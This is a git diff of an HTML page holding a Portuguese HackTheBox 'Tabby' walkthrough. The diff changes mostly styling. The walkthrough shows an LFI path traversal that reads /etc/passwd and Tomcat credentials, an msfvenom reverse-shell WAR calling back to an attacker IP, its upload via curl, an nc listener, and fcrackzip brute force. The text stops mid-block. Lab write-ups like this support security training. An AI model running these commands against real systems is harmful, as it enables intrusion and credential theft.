@@ -203,6 +203,8 @@ fetchInject(["/js/lazysizes.min.js"]);
     
       <a itemprop="url" class="" href="/sobre/"><span itemprop="name">sobre</span></a>
     
+      <a itemprop="url" class="" href="/busca/"><span itemprop="name">busca</span></a>
+    
   </nav>
 
 
@@ -212,32 +214,32 @@ fetchInject(["/js/lazysizes.min.js"]);
     <h1>Tabby</h1>
   </header>
   <p><img src="/tabby-01.png" alt="HTB"></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
-</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-</span></span><span class="line"><span class="cl">80/tcp   open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
-</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Mega Hosting
-</span></span><span class="line"><span class="cl">8080/tcp open  http    Apache Tomcat
-</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: OPTIONS GET HEAD POST
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Apache Tomcat
-</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">NSE: Script Post-scanning.
-</span></span><span class="line"><span class="cl">Initiating NSE at 17:20
-</span></span><span class="line"><span class="cl">Completed NSE at 17:20, 0.00s elapsed
-</span></span><span class="line"><span class="cl">Initiating NSE at 17:20
-</span></span><span class="line"><span class="cl">Completed NSE at 17:20, 0.00s elapsed
-</span></span><span class="line"><span class="cl">Initiating NSE at 17:20
-</span></span><span class="line"><span class="cl">Completed NSE at 17:20, 0.00s elapsed
-</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
-</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 20.88 seconds
-</span></span><span class="line"><span class="cl">           Raw packets sent: <span class="m">82699</span> <span class="o">(</span>3.639MB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">66386</span> <span class="o">(</span>2.655MB<span class="o">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Mega Hosting
+</span></span><span style="display:flex;"><span>8080/tcp open  http    Apache Tomcat
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: OPTIONS GET HEAD POST
+</span></span><span style="display:flex;"><span>|_http-open-proxy: Proxy might be redirecting requests
+</span></span><span style="display:flex;"><span>|_http-title: Apache Tomcat
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NSE: Script Post-scanning.
+</span></span><span style="display:flex;"><span>Initiating NSE at 17:20
+</span></span><span style="display:flex;"><span>Completed NSE at 17:20, 0.00s elapsed
+</span></span><span style="display:flex;"><span>Initiating NSE at 17:20
+</span></span><span style="display:flex;"><span>Completed NSE at 17:20, 0.00s elapsed
+</span></span><span style="display:flex;"><span>Initiating NSE at 17:20
+</span></span><span style="display:flex;"><span>Completed NSE at 17:20, 0.00s elapsed
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 20.88 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">82699</span> <span style="color:#f92672">(</span>3.639MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">66386</span> <span style="color:#f92672">(</span>2.655MB<span style="color:#f92672">)</span>
 </span></span></code></pre></div><p><img src="/tabby-02.png" alt="HTB"></p>
 <p>blz vou tentar acessar a porta  8080</p>
 <p><img src="/tabby-03.png" alt="HTB"></p>
@@ -253,35 +255,35 @@ fetchInject(["/js/lazysizes.min.js"]);
 <p>Por isso entendi o por que dos paths dentro da porta 8080</p>
 <p>exemplo:</p>
 <p>megahosting.htb/news.php?file=../../../../etc/passwd</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:997:997::/opt/tomcat:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ash:x:1000:1000:clive:/home/ash:/bin/bash 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:997:997::/opt/tomcat:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ash:x:1000:1000:clive:/home/ash:/bin/bash 
 </span></span></code></pre></div><p>agora consigo ver dentro desses paths que ele deu a dica lá atrás</p>
 <p>/var/lib/tomcat9/webapps/ROOT/index.html</p>
 <p>/var/lib/tomcat9</p>
 <p>/usr/share/doc/tomcat9-common/RUNNING.txt.gz</p>
 <p>/etc/tomcat9/tomcat-users.xml.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://megahosting.htb/news.php?file<span class="o">=</span>../../../../usr/share/tomcat9/etc/tomcat-users.xml
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://megahosting.htb/news.php?file<span style="color:#f92672">=</span>../../../../usr/share/tomcat9/etc/tomcat-users.xml
 </span></span></code></pre></div><p>Inspecione a págna para ver os atributos de acordo com a documentação do LFI</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">   &lt;role <span class="nv">rolename</span><span class="o">=</span><span class="s2">&#34;admin-gui&#34;</span>/&gt;
-</span></span><span class="line"><span class="cl">   &lt;role <span class="nv">rolename</span><span class="o">=</span><span class="s2">&#34;manager-script&#34;</span>/&gt;
-</span></span><span class="line"><span class="cl">   &lt;user <span class="nv">username</span><span class="o">=</span><span class="s2">&#34;tomcat&#34;</span> <span class="nv">password</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$3</span><span class="s2">cureP4s5w0rd123!&#34;</span> <span class="nv">roles</span><span class="o">=</span><span class="s2">&#34;admin-gui,manager-script&#34;</span>/&gt;
-</span></span><span class="line"><span class="cl">&lt;/tomcat-users&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>   &lt;role rolename<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin-gui&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>   &lt;role rolename<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;manager-script&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>   &lt;user username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tomcat&#34;</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$3<span style="color:#e6db74">cureP4s5w0rd123!&#34;</span> roles<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin-gui,manager-script&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>&lt;/tomcat-users&gt;
 </span></span></code></pre></div><p>agora podemos fazer o shell reverso
 igual nas outras maquinas</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">msfvenom -p java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.29 &lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f war &gt; exploit.war
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.29 &lt;IP&gt; LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f war &gt; exploit.war
 </span></span></code></pre></div><p>Depois fazemos upload do arquivo war</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl --user <span class="s1">&#39;tomcat:$3cureP4s5w0rd123!&#39;</span> --upload-file exploit.war <span class="s2">&#34;http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --user <span style="color:#e6db74">&#39;tomcat:$3cureP4s5w0rd123!&#39;</span> --upload-file exploit.war <span style="color:#e6db74">&#34;http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war&#34;</span>
 </span></span></code></pre></div><p>em outra aba do terminal, deixe escutando na porta que desejar</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -nvlp <span class="m">4444</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">4444</span>
 </span></span></code></pre></div><p>com o netcat</p>
 <p>Quando estiver ouvindo a porta,  vá no navegador e chame o arquivo que vc acabou de fazer o upload</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://10.10.10.194:8080/exploit.war/
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://10.10.10.194:8080/exploit.war/
 </span></span></code></pre></div><p>volte no terminal, ele vai ter conectado via shell
 agora execute o shell reverso em python para o term</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
-</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.29<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.194<span class="o">]</span> <span class="m">50476</span>
-</span></span><span class="line"><span class="cl">python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
-</span></span><span class="line"><span class="cl">tomcat@tabby:/var/lib/tomcat9$ 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.29<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.194<span style="color:#f92672">]</span> <span style="color:#ae81ff">50476</span>
+</span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span>tomcat@tabby:/var/lib/tomcat9$ 
 </span></span></code></pre></div><p>Agora entre em  /var/www/files</p>
 <p>vc vai encontrar o arquivo  16162020_backup.zip</p>
 <p>acesse no navegador</p>
@@ -290,35 +292,35 @@ agora execute o shell reverso em python para o term</p>
 <p>ele ta protegido com senha</p>
 <p>vai ser necessário usar o  <code>fcrackzip</code> nele se não tiver ele instalado, basta, instalar:</p>
 <h1 id="apt-get-install-fcrackzip">apt-get install fcrackzip</h1>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> root  ~  fcrackzip -h
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">fcrackzip version 1.0, a fast/free zip password cracker
-</span></span><span class="line"><span class="cl">written by Marc Lehmann &lt;pcg@goof.com&gt; You can find more info on
-</span></span><span class="line"><span class="cl">http://www.goof.com/pcg/marc/
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">USAGE: fcrackzip
-</span></span><span class="line"><span class="cl">          <span class="o">[</span>-b<span class="p">|</span>--brute-force<span class="o">]</span>            use brute force algorithm
-</span></span><span class="line"><span class="cl">          <span class="o">[</span>-D<span class="p">|</span>--dictionary<span class="o">]</span>             use a dictionary
-</span></span><span class="line"><span class="cl">          <span class="o">[</span>-B<span class="p">|</span>--benchmark<span class="o">]</span>              execute a small benchmark
-</span></span><span class="line"><span class="cl">          <span class="o">[</span>-c<span class="p">|</span>--charset characterset<span class="o">]</span>   use characters from charset
-</span></span><span class="line"><span class="cl">          <span class="o">[</span>-h<span class="p">|</span>--help<span class="o">]</span>                   show this message
-</span></span><span class="line"><span class="cl">          <span class="o">[</span>--version<span class="o">]</span>                   show the version of this program
-</span></span><span class="line"><span class="cl">          <span class="o">[</span>-V<span class="p">|</span>--validate<span class="o">]</span>               sanity-check the algorithm
-</span></span><span class="line"><span class="cl">          <span class="o">[</span>-v<span class="p">|</span>--verbose<span class="o">]</span>                be more verbose
-</span></span><span class="line"><span class="cl">          <span class="o">[</span>-p<span class="p">|</span>--init-password string<span class="o">]</span>   use string as initial password/file
-</span></span><span class="line"><span class="cl">          <span class="o">[</span>-l<span class="p">|</span>--length min-max<span class="o">]</span>         check password with length min to max
-</span></span><span class="line"><span class="cl">          <span class="o">[</span>-u<span class="p">|</span>--use-unzip<span class="o">]</span>              use unzip to weed out wrong passwords
-</span></span><span class="line"><span class="cl">          <span class="o">[</span>-m<span class="p">|</span>--method num<span class="o">]</span>             use method number <span class="s2">&#34;num&#34;</span> <span class="o">(</span>see below<span class="o">)</span>
-</span></span><span class="line"><span class="cl">          <span class="o">[</span>-2<span class="p">|</span>--modulo r/m<span class="o">]</span>             only calculcate 1/m of the password
-</span></span><span class="line"><span class="cl">          file...                    the zipfiles to crack
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">methods compiled in <span class="o">(</span>* <span class="o">=</span> default<span class="o">)</span>:
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"> 0: cpmask
-</span></span><span class="line"><span class="cl"> 1: zip1
-</span></span><span class="line"><span class="cl">*2: zip2, USE_MULT_TAB
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> root  ~  fcrackzip -h
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fcrackzip version 1.0, a fast/free zip password cracker
+</span></span><span style="display:flex;"><span>written by Marc Lehmann &lt;pcg@goof.com&gt; You can find more info on
+</span></span><span style="display:flex;"><span>http://www.goof.com/pcg/marc/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>USAGE: fcrackzip
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span>-b|--brute-force<span style="color:#f92672">]</span>            use brute force algorithm
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span>-D|--dictionary<span style="color:#f92672">]</span>             use a dictionary
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span>-B|--benchmark<span style="color:#f92672">]</span>              execute a small benchmark
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span>-c|--charset characterset<span style="color:#f92672">]</span>   use characters from charset
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span>-h|--help<span style="color:#f92672">]</span>                   show this message
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span>--version<span style="color:#f92672">]</span>                   show the version of this program
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span>-V|--validate<span style="color:#f92672">]</span>               sanity-check the algorithm
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span>-v|--verbose<span style="color:#f92672">]</span>                be more verbose
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span>-p|--init-password string<span style="color:#f92672">]</span>   use string as initial password/file
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span>-l|--length min-max<span style="color:#f92672">]</span>         check password with length min to max
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span>-u|--use-unzip<span style="color:#f92672">]</span>              use unzip to weed out wrong passwords
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span>-m|--method num<span style="color:#f92672">]</span>             use method number <span style="color:#e6db74">&#34;num&#34;</span> <span style="color:#f92672">(</span>see below<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span>-2|--modulo r/m<span style="color:#f92672">]</span>             only calculcate 1/m of the password
+</span></span><span style="display:flex;"><span>          file...                    the zipfiles to crack
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>methods compiled in <span style="color:#f92672">(</span>* <span style="color:#f92672">=</span> default<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> 0: cpmask
+</span></span><span style="display:flex;"><span> 1: zip1
+</span></span><span style="display:flex;"><span>*2: zip2, USE_MULT_TAB
 </span></span></code></pre></div><p>Usei esses parametros e a lista  rockyou para fazer o brute forte</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">fcrackzip -b -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fcrackzip -b -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
 </span></span></code></pre></div><p>Foi rápido até</p>
 <p>possible pw found: admin@it ()</p>
 <p>com essa senha da para descompactar o arquivo na verdade essa senha nao vai ser para  descompactar o arquivo, essa senha é do user da maquina</p>
@@ -326,140 +328,140 @@ agora execute o shell reverso em python para o term</p>
 e va para o</p>
 <p>cd /home</p>
 <p>Faça login com esse tal de ash</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tomcat@tabby:/home$ ls
-</span></span><span class="line"><span class="cl">ls
-</span></span><span class="line"><span class="cl">ash
-</span></span><span class="line"><span class="cl">tomcat@tabby:/home$ <span class="nb">cd</span> ash    
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ash
-</span></span><span class="line"><span class="cl">bash: cd: ash: Permission denied
-</span></span><span class="line"><span class="cl">tomcat@tabby:/home$ su ash
-</span></span><span class="line"><span class="cl">su ash
-</span></span><span class="line"><span class="cl">Password: admin@it
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">ash@tabby:/home$ ls
-</span></span><span class="line"><span class="cl">ls
-</span></span><span class="line"><span class="cl">ash
-</span></span><span class="line"><span class="cl">ash@tabby:/home$ 
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ash@tabby:/home$ <span class="nb">cd</span> ash
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ash
-</span></span><span class="line"><span class="cl">ash@tabby:~$ ls
-</span></span><span class="line"><span class="cl">ls
-</span></span><span class="line"><span class="cl">linpeas.sh  snap  user.txt
-</span></span><span class="line"><span class="cl">ash@tabby:~$ 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tomcat@tabby:/home$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>ash
+</span></span><span style="display:flex;"><span>tomcat@tabby:/home$ cd ash    
+</span></span><span style="display:flex;"><span>cd ash
+</span></span><span style="display:flex;"><span>bash: cd: ash: Permission denied
+</span></span><span style="display:flex;"><span>tomcat@tabby:/home$ su ash
+</span></span><span style="display:flex;"><span>su ash
+</span></span><span style="display:flex;"><span>Password: admin@it
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ash@tabby:/home$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>ash
+</span></span><span style="display:flex;"><span>ash@tabby:/home$ 
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ash@tabby:/home$ cd ash
+</span></span><span style="display:flex;"><span>cd ash
+</span></span><span style="display:flex;"><span>ash@tabby:~$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>linpeas.sh  snap  user.txt
+</span></span><span style="display:flex;"><span>ash@tabby:~$ 
 </span></span></code></pre></div><p>a flag de user</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ash@tabby:~$ id
-</span></span><span class="line"><span class="cl">id
-</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,116<span class="o">(</span>lxd<span class="o">)</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ash@tabby:~$ sudo -l
-</span></span><span class="line"><span class="cl">    sudo: unable to open /run/sudo/ts/ash: Read-only file system
-</span></span><span class="line"><span class="cl">    <span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> ash: 
-</span></span><span class="line"><span class="cl">     Sorry, user ash may not run sudo on tabby.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ash@tabby:~$ id
+</span></span><span style="display:flex;"><span>id
